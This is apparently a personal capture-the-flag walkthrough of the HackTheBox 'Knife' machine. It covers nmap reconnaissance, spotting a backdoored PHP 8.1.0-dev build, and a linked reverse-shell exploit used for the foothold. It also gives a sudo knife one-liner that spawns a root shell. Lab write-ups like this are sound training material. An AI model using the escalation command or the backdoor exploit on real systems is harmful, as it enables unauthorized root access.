>[!tldr] Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of #PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.

---
1. I start off with `nmap`
	`nmap -sT 10.129.6.236 -p-`
	-> Ports: `22` and `80` 
	`nmap -sCV 10.129.6.236 -p22,80`
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
2. I then head to `ZAP` and check out the website. None of the links work, but something like `index.php` works meaning its a `php` website
3. I then used `curl` with `-I` parameter to find more info
```shell
❯ curl -I http://10.129.6.236
HTTP/1.1 200 OK
Date: Wed, 24 Jun 2026 19:54:31 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```
- We found the php version! `PHP/8.1.0-dev`
4. After a search for this version of php we find that it had a backdoor. I found a [github repo](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) which had a python script which would create a reverse shell. After running the script we are into the system as `james@knife:/$`
	1. Within `/home/james/user.txt` we get the flag -> `[REDACTED_FLAG]`
5. I then search up privilege escalation techniques and go down several paths
	1. The `sudo` version of `1.8.31` has CVE:2023-22809. Though it does not work in this situation.
	2. I then check in `gtfobins` for `knife` since it appeared from `sudo -l` 
		1. `gtfobins` -> `knife exec -E '...'` 
			- However this did not work, instead we need `ruby` code inside (where the ellipsis is). We can find what code gets us sudo from `gtfobins` as well
		2. `sudo knife exec -E "exec '/bin/bash'"` -> Root!
6. Now with root i start to enumerate and find `root.txt` which had the flag
	1. Root -> `[REDACTED_FLAG]`